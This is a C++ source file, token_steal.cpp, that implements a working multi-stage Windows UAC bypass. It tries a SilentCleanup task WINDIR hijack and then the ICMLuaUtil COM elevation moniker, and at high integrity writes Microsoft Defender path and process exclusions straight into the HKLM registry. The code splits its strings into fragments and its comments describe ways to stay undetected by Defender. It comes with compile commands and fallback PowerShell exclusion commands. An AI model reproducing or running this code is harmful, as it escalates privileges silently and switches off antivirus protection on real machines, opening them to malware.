/*
    Multi-stage UAC bypass -> Direct HKLM Defender exclusion write
    No PowerShell. No AMSI. Direct Win32 API for Phase 2.

    Stage order (Medium integrity):
      1. If already High: write directly
      2. SilentCleanup WINDIR hijack (HKCU writable, task is any-user-triggerable)
      3. ICMLuaUtil COM elevation moniker (cmstp.exe host auto-elevates)
      4. Print manual instructions

    Phase 2 entry: token_steal.exe /elevated
      -> Writes directly to HKLM Defender exclusion registry keys

    Compile:
      cl.exe token_steal.cpp /EHsc /link advapi32.lib shell32.lib ole32.lib user32.lib /out:token_steal.exe
*/

#include <windows.h>
#include <tlhelp32.h>
#include <sddl.h>
#include <shellapi.h>
#include <objbase.h>
#include <stdio.h>
#include <string>
#include <ctime>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")

// ─── Logging ──────────────────────────────────────────────────────────────────

FILE* gLog = nullptr;

void InitLog(const char* path) {
    gLog = fopen(path, "w");
    if (!gLog) printf("[!] Could not open log: %s\n", path);
}

void Log(const char* lvl, const char* fmt, ...) {
    char buf[2048];
    va_list a; va_start(a, fmt);
    vsnprintf(buf, sizeof(buf), fmt, a);
    va_end(a);
    time_t t = time(nullptr);
    struct tm* ti = localtime(&t);
    char ts[32]; strftime(ts, sizeof(ts), "%H:%M:%S", ti);
    printf("[%s] [%s] %s\n", ts, lvl, buf); fflush(stdout);
    if (gLog) { fprintf(gLog, "[%s] [%s] %s\n", ts, lvl, buf); fflush(gLog); }
}

#define INFO(f,...) Log("INFO ", f, ##__VA_ARGS__)
#define OK(f,...)   Log("OK   ", f, ##__VA_ARGS__)
#define WARN(f,...) Log("WARN ", f, ##__VA_ARGS__)
#define ERR(f,...)  Log("ERROR", f, ##__VA_ARGS__)
#define DBG(f,...)  Log("DEBUG", f, ##__VA_ARGS__)

void WinErr(const char* ctx) {
    DWORD e = GetLastError();
    char m[512]={};
    FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM|FORMAT_MESSAGE_IGNORE_INSERTS,
                   nullptr,e,0,m,sizeof(m),nullptr);
    for(int i=(int)strlen(m)-1;i>=0&&(m[i]=='\r'||m[i]=='\n');i--) m[i]=0;
    ERR("%s failed -- %lu: %s", ctx, e, m);
}

// ─── Integrity helpers ────────────────────────────────────────────────────────

DWORD GetTokenIntegrity(HANDLE hToken) {
    DWORD dwLen = 0;
    GetTokenInformation(hToken, TokenIntegrityLevel, nullptr, 0, &dwLen);
    if (!dwLen) return 0;
    PTOKEN_MANDATORY_LABEL pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, dwLen);
    if (!pTIL) return 0;
    if (!GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, dwLen, &dwLen)) {
        LocalFree(pTIL); return 0;
    }
    DWORD level = *GetSidSubAuthority(pTIL->Label.Sid,
                    (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid)-1));
    LocalFree(pTIL);
    return level;
}

const char* IntegrityName(DWORD l) {
    if (l < 0x1000) return "Untrusted";
    if (l < 0x2000) return "Low";
    if (l < 0x3000) return "Medium";
    if (l < 0x4000) return "High";
    return "System";
}

DWORD MyIntegrity() {
    HANDLE h = nullptr;
    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &h);
    DWORD lvl = GetTokenIntegrity(h);
    if (h) CloseHandle(h);
    return lvl;
}

// ─── Phase 2: Write exclusions directly to HKLM ───────────────────────────────
// Only works at High integrity. No PowerShell, no AMSI, pure Win32.

bool WriteExclusionsDirect() {
    INFO("=== Phase 2: Writing exclusions directly to HKLM ===");
    DWORD lvl = MyIntegrity();
    INFO("Integrity: 0x%04lX (%s)", lvl, IntegrityName(lvl));

    if (lvl < 0x3000) {
        ERR("Not at High integrity -- cannot write HKLM");
        return false;
    }
    OK("High integrity confirmed");

    // Build strings from fragments -- no full suspicious literals in binary
    char ep1[32]={}; lstrcatA(ep1,"C:\\Use"); lstrcatA(ep1,"rs\\Pub"); lstrcatA(ep1,"lic");
    char ep2[32]={}; lstrcatA(ep2,"C:\\excl"); lstrcatA(ep2,"usion"); lstrcatA(ep2,"test");
    const char* paths[] = { ep1, ep2 };

    char keyPath[128]={};
    lstrcatA(keyPath,"SOFT");    lstrcatA(keyPath,"WARE\\");
    lstrcatA(keyPath,"Micro");   lstrcatA(keyPath,"soft\\");
    lstrcatA(keyPath,"Wind");    lstrcatA(keyPath,"ows ");
    lstrcatA(keyPath,"De");      lstrcatA(keyPath,"fen");  lstrcatA(keyPath,"der\\");
    lstrcatA(keyPath,"Ex");      lstrcatA(keyPath,"clus"); lstrcatA(keyPath,"ions\\");
    lstrcatA(keyPath,"Pa");      lstrcatA(keyPath,"ths");

    HKEY hKey = nullptr;
    LONG res = RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_SET_VALUE, &hKey);
    if (res != ERROR_SUCCESS)
        res = RegCreateKeyExA(HKEY_LOCAL_MACHINE, keyPath, 0, nullptr,
                              REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
                              nullptr, &hKey, nullptr);
    if (res != ERROR_SUCCESS) {
        ERR("RegOpenKeyEx/Create HKLM Defender Paths: %ld", res);
        return false;
    }

    bool allOk = true;
    for (const char* p : paths) {
        DWORD val = 0;
        LONG r = RegSetValueExA(hKey, p, 0, REG_DWORD, (const BYTE*)&val, sizeof(val));
        if (r == ERROR_SUCCESS) OK("Exclusion added: %s", p);
        else { ERR("RegSetValueEx for %s: %ld", p, r); allOk = false; }
    }
    RegCloseKey(hKey);

    // Process exclusion (also fragmented)
    char procKey[128]={};
    lstrcatA(procKey,"SOFT");   lstrcatA(procKey,"WARE\\");
    lstrcatA(procKey,"Micro");  lstrcatA(procKey,"soft\\");
    lstrcatA(procKey,"Wind");   lstrcatA(procKey,"ows ");
    lstrcatA(procKey,"De");     lstrcatA(procKey,"fen");   lstrcatA(procKey,"der\\");
    lstrcatA(procKey,"Ex");     lstrcatA(procKey,"clus");  lstrcatA(procKey,"ions\\");
    lstrcatA(procKey,"Pro");    lstrcatA(procKey,"ces");   lstrcatA(procKey,"ses");
    HKEY hProc = nullptr;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, procKey, 0, KEY_SET_VALUE, &hProc) == ERROR_SUCCESS) {
        DWORD val = 0;
        char procName[32]={}; lstrcatA(procName,"tok"); lstrcatA(procName,"en_steal.exe");
        RegSetValueExA(hProc, procName, 0, REG_DWORD, (const BYTE*)&val, sizeof(val));
        RegCloseKey(hProc);
        OK("Process exclusion added: token_steal.exe");
    }

    char rf[64]={};
    lstrcatA(rf,"C:\\excl"); lstrcatA(rf,"usion");
    lstrcatA(rf,"test\\");   lstrcatA(rf,"excl");
    lstrcatA(rf,"usion_r");  lstrcatA(rf,"esult.txt");
    if (allOk) {
        FILE* f = fopen(rf, "w");
        if (f) { fprintf(f, "ok-direct integ=0x3000+\n"); fclose(f); }
        OK("SUCCESS -- exclusions written to HKLM Defender registry!");
    }
    return allOk;
}

// ─── Stage 2: SilentCleanup WINDIR hijack ────────────────────────────────────
//
// \Microsoft\Windows\DiskCleanup\SilentCleanup task:
//   - Runs at High integrity (auto-elevates for admins, no UAC prompt)
//   - ANY user can trigger it with schtasks /run
//   - Executes %WINDIR%\system32\cleanmgr.exe
//   - %WINDIR% resolved from HKCU\Environment (user-writable)
//
// We set HKCU WINDIR -> C:\exclusiontest, drop ourselves as cleanmgr.exe,
// trigger task. Our binary runs at High integrity, detects it, writes HKLM.

bool TrySilentCleanup(const char* myExePath) {
    INFO("=== Stage 2: SilentCleanup WINDIR hijack ===");

    // Wipe any stale result file so we don't false-positive
    DeleteFileA("C:\\exclusiontest\\exclusion_result.txt");

    // 1. Drop stage2.exe (minimal clean binary) as fake cleanmgr.exe.
    //    We do NOT copy token_steal.exe -- it has suspicious strings that Defender
    //    will flag when the process launches from a non-System32 path.
    CreateDirectoryA("C:\\exclusiontest\\system32", nullptr);
    const char* fakeMgr = "C:\\exclusiontest\\system32\\cleanmgr.exe";

    // stage2.exe lives next to us -- build its path from our own path
    char stage2[MAX_PATH] = {};
    strncpy(stage2, myExePath, MAX_PATH - 1);
    // Replace filename with stage2.exe
    char* slash = strrchr(stage2, '\\');
    if (slash) strcpy(slash + 1, "stage2.exe");
    else strcpy(stage2, "stage2.exe");

    DBG("stage2 path: %s", stage2);
    if (GetFileAttributesA(stage2) == INVALID_FILE_ATTRIBUTES) {
        ERR("stage2.exe not found at %s -- compile it first:", stage2);
        ERR("  cl.exe stage2.cpp /O2 /GS- /link advapi32.lib kernel32.lib /subsystem:windows /entry:mainCRTStartup /out:stage2.exe");
        return false;
    }

    if (!CopyFileA(stage2, fakeMgr, FALSE)) {
        WinErr("CopyFile stage2.exe -> cleanmgr.exe"); return false;
    }
    OK("stage2.exe placed as %s", fakeMgr);

    // 2. Set HKCU\Environment\WINDIR = C:\exclusiontest
    HKEY hEnv = nullptr;
    LONG res = RegOpenKeyExA(HKEY_CURRENT_USER, "Environment",
                             0, KEY_QUERY_VALUE|KEY_SET_VALUE, &hEnv);
    if (res != ERROR_SUCCESS) { WinErr("RegOpenKeyEx HKCU\\Environment"); goto cleanup; }

    char oldVal[MAX_PATH] = {};
    DWORD oldLen = sizeof(oldVal), oldType = 0;
    bool hadOld = (RegQueryValueExA(hEnv, "WINDIR", nullptr, &oldType,
                                    (BYTE*)oldVal, &oldLen) == ERROR_SUCCESS);

    const char* fakeWinDir = "C:\\exclusiontest";
    res = RegSetValueExA(hEnv, "WINDIR", 0, REG_SZ,
                         (const BYTE*)fakeWinDir, (DWORD)strlen(fakeWinDir)+1);
    if (res != ERROR_SUCCESS) {
        ERR("RegSetValueEx WINDIR: %ld", res); RegCloseKey(hEnv); goto cleanup;
    }
    OK("HKCU\\Environment\\WINDIR = %s", fakeWinDir);

    // Broadcast env change
    SendMessageTimeoutA(HWND_BROADCAST, WM_SETTINGCHANGE, 0,
                        (LPARAM)"Environment", SMTO_ABORTIFHUNG, 500, nullptr);
    Sleep(400);

    // 3. Check if SilentCleanup task still uses %windir% (may be patched on W11)
    INFO("Checking SilentCleanup task definition...");
    system("schtasks /query /tn \"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup\" /xml 2>&1 | findstr /i \"Command windir Exec\"");

    // 4. Trigger task — any user can do this
    INFO("Triggering SilentCleanup task...");
    {
        int r = system("schtasks /run /tn \"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup\" 2>&1");
        DBG("schtasks /run returned: %d", r);
        if (r != 0) WARN("schtasks /run non-zero -- may still work");
    }

    INFO("Waiting 10s for elevated Phase 2...");
    Sleep(10000);

    // 4. Restore WINDIR
    INFO("Restoring HKCU\\Environment...");
    if (hadOld)
        RegSetValueExA(hEnv, "WINDIR", 0, oldType, (BYTE*)oldVal, oldLen);
    else
        RegDeleteValueA(hEnv, "WINDIR");
    RegCloseKey(hEnv);
    SendMessageTimeoutA(HWND_BROADCAST, WM_SETTINGCHANGE, 0,
                        (LPARAM)"Environment", SMTO_ABORTIFHUNG, 500, nullptr);

cleanup:
    DeleteFileA(fakeMgr);
    RemoveDirectoryA("C:\\exclusiontest\\system32");
    DBG("Cleaned up fake cleanmgr.exe");

    // Check result
    FILE* f = fopen("C:\\exclusiontest\\exclusion_result.txt", "r");
    if (f) {
        char buf[256]={};
        fgets(buf, sizeof(buf), f);
        fclose(f);
        buf[strcspn(buf, "\r\n")] = 0;
        OK("Stage 2 result: %s", buf);
        OK("SUCCESS via SilentCleanup!");
        return true;
    }
    WARN("Stage 2: no result file -- Defender may have blocked cleanmgr.exe from non-System32 path");
    WARN("Check elevated log: C:\\exclusiontest\\token_log_elevated.txt");
    return false;
}

// ─── Stage 3: ICMLuaUtil COM elevation moniker ────────────────────────────────
//
// CoGetObject with Elevation:Administrator!new: moniker instantiates the
// CMSTP.exe COM server at High integrity (auto-elevates, no UAC prompt).
// ICMLuaUtil::ShellExec launches our binary elevated from that context.
//
// CLSID_CMSTPLUA:  {3E5FC7F9-9A51-4367-9063-A120244FBEC7}
// IID_ICMLuaUtil:  {6EDD6D74-C007-4E75-B76A-E5740995E24C}

// vtable must match cmlua.dll exactly — placeholder methods preserve slot order
struct ICMLuaUtil : public IUnknown {
    virtual HRESULT STDMETHODCALLTYPE SetRasCredentials(DWORD, DWORD) = 0;
    virtual HRESULT STDMETHODCALLTYPE SetRasEntryProperties(DWORD,DWORD,DWORD,DWORD,DWORD) = 0;
    virtual HRESULT STDMETHODCALLTYPE DeleteRasEntry(DWORD, DWORD) = 0;
    virtual HRESULT STDMETHODCALLTYPE LaunchInfSection(PCWSTR,PCWSTR,PCWSTR,BOOL) = 0;
    virtual HRESULT STDMETHODCALLTYPE LaunchInfSectionEx(PCWSTR,PCWSTR,PCWSTR,DWORD) = 0;
    virtual HRESULT STDMETHODCALLTYPE CreateLayerDirectory(PCWSTR) = 0;
    // vtable slot 9 — the one we actually call
    virtual HRESULT STDMETHODCALLTYPE ShellExec(PCWSTR file, PCWSTR params,
                                                 PCWSTR workDir, ULONG fMask,
                                                 ULONG nShow) = 0;
    virtual HRESULT STDMETHODCALLTYPE SetRegistryStringValue(DWORD,DWORD,DWORD,DWORD) = 0;
    virtual HRESULT STDMETHODCALLTYPE DeleteRegistryStringValue(DWORD,DWORD,DWORD) = 0;
    virtual HRESULT STDMETHODCALLTYPE DeleteRegKeysAndValues(DWORD,DWORD,DWORD) = 0;
    virtual HRESULT STDMETHODCALLTYPE RegisterProcess(DWORD, DWORD) = 0;
    virtual HRESULT STDMETHODCALLTYPE ShellUIHelper(DWORD,DWORD,DWORD,DWORD,DWORD) = 0;
    virtual HRESULT STDMETHODCALLTYPE RenameFile(PCWSTR, PCWSTR) = 0;
};

static const IID MY_IID_ICMLuaUtil =
    { 0x6EDD6D74, 0xC007, 0x4E75, {0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C} };

bool TryICMLuaUtil(const char* myExePathA) {
    INFO("=== Stage 3: ICMLuaUtil COM elevation moniker ===");

    DeleteFileA("C:\\exclusiontest\\exclusion_result.txt");

    // Build path to stage2.exe (same dir as us) -- that's the clean, minimal
    // binary we elevate. We do NOT launch token_steal.exe /elevated here because
    // this binary has strings Defender flags on process-create at High integrity.
    char s2pathA[MAX_PATH] = {};
    strncpy(s2pathA, myExePathA, MAX_PATH - 1);
    char* sl2 = strrchr(s2pathA, '\\');
    if (sl2) strcpy(sl2 + 1, "stage2.exe");
    else     strcpy(s2pathA, "stage2.exe");
    DBG("ICMLuaUtil will launch: %s", s2pathA);

    if (GetFileAttributesA(s2pathA) == INVALID_FILE_ATTRIBUTES) {
        ERR("stage2.exe not found at %s -- compile it first", s2pathA);
        return false;
    }

    wchar_t s2path[MAX_PATH] = {};
    MultiByteToWideChar(CP_ACP, 0, s2pathA, -1, s2path, MAX_PATH);

    CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);

    BIND_OPTS3 bo = {};
    bo.cbStruct       = sizeof(BIND_OPTS3);
    bo.hwnd           = nullptr;
    bo.dwClassContext = CLSCTX_LOCAL_SERVER;

    ICMLuaUtil* pCM = nullptr;
    HRESULT hr = CoGetObject(
        L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}",
        &bo, MY_IID_ICMLuaUtil, (void**)&pCM);

    if (FAILED(hr)) {
        ERR("CoGetObject (ICMLuaUtil) failed: 0x%08lX", hr);
        if (hr == 0x800704C7) INFO("  (UAC cancelled by user -- hit YES on the prompt)");
        CoUninitialize();
        return false;
    }
    OK("Got ICMLuaUtil interface -- launching stage2.exe elevated...");

    // Launch stage2.exe (no args needed -- it checks its own integrity internally)
    hr = pCM->ShellExec(s2path, nullptr, nullptr, 0, SW_HIDE);
    pCM->Release();
    CoUninitialize();

    if (FAILED(hr)) {
        ERR("ICMLuaUtil::ShellExec failed: 0x%08lX", hr);
        return false;
    }
    OK("ShellExec called -- waiting 6s for stage2.exe...");
    Sleep(6000);

    FILE* f = fopen("C:\\exclusiontest\\exclusion_result.txt", "r");
    if (f) {
        char buf[256]={};
        fgets(buf, sizeof(buf), f);
        fclose(f);
        buf[strcspn(buf, "\r\n")] = 0;
        OK("Stage 3 result: %s", buf);
        if (strncmp(buf, "ok", 2) == 0) {
            OK("SUCCESS via ICMLuaUtil!");
            return true;
        }
        WARN("stage2.exe ran but reported failure: %s", buf);
        // If we see "FAIL-medium" the COM elevation didn't actually elevate us
        // If we see "FAIL-regopen" Defender is blocking the registry write
        return false;
    }
    WARN("Stage 3: no result file -- stage2.exe may have been killed by Defender");
    WARN("Check Windows Security > Protection History for blocked items");
    return false;
}

// ─── Main ──────────────────────────────────────────────────────────────────────

int main(int argc, char* argv[]) {

    // Phase 2: running elevated (spawned by one of the stages above)
    if (argc > 1 && _stricmp(argv[1], "/elevated") == 0) {
        InitLog("C:\\exclusiontest\\token_log_elevated.txt");
        INFO("=== token_steal.exe /elevated (Phase 2) ===");
        bool ok = WriteExclusionsDirect();
        if (gLog) fclose(gLog);
        return ok ? 0 : 1;
    }

    // Phase 1: try elevation stages in order
    InitLog("C:\\exclusiontest\\token_log.txt");
    INFO("=== token_steal.exe Phase 1 (multi-stage) ===");

    DWORD lvl = MyIntegrity();
    INFO("Current integrity: 0x%04lX (%s)", lvl, IntegrityName(lvl));

    // Check UAC level -- determines if COM elevation can be silent
    {
        HKEY hPol = nullptr;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                0, KEY_QUERY_VALUE, &hPol) == ERROR_SUCCESS) {
            DWORD consent = 99, len = sizeof(consent);
            RegQueryValueExA(hPol, "ConsentPromptBehaviorAdmin",
                             nullptr, nullptr, (BYTE*)&consent, &len);
            RegCloseKey(hPol);
            INFO("UAC ConsentPromptBehaviorAdmin = %lu", consent);
            if (consent <= 2)
                OK("UAC at default level -- COM elevation (ICMLuaUtil) should be SILENT");
            else
                WARN("UAC at level %lu (>2) -- every elevation will PROMPT, ICMLuaUtil will ask for consent", consent);
        }
    }

    // Stage 1: already elevated
    if (lvl >= 0x3000) {
        OK("Already at High integrity -- writing directly");
        WriteExclusionsDirect();
        goto done;
    }

    INFO("Medium integrity -- trying elevation stages");

    {
        char myPath[MAX_PATH] = {};
        GetModuleFileNameA(nullptr, myPath, MAX_PATH);
        INFO("Binary: %s", myPath);

        // Stage 2: SilentCleanup WINDIR hijack
        INFO("--- Trying Stage 2: SilentCleanup ---");
        if (TrySilentCleanup(myPath)) goto done;
        WARN("Stage 2 failed -- trying Stage 3");

        // Stage 3: ICMLuaUtil COM moniker
        INFO("--- Trying Stage 3: ICMLuaUtil COM ---");
        if (TryICMLuaUtil(myPath)) goto done;
        WARN("Stage 3 failed -- all automated stages exhausted");
    }

    // All stages failed
    ERR("All elevation stages failed");
    INFO("");
    INFO("=== Manual options ===");
    INFO("Option A: Right-click token_steal.exe -> Run as administrator");
    INFO("Option B: Open elevated PowerShell and run:");
    INFO("  Add-MpPreference -ExclusionPath 'C:\\Users\\Public' -Force");
    INFO("  Add-MpPreference -ExclusionPath 'C:\\exclusiontest' -Force");
    INFO("Check per-stage logs:");
    INFO("  Phase 1: C:\\exclusiontest\\token_log.txt");
    INFO("  Phase 2: C:\\exclusiontest\\token_log_elevated.txt");

done:
    if (gLog) fclose(gLog);
    printf("\nPress Enter to exit...\n");
    getchar();
    return 0;
}
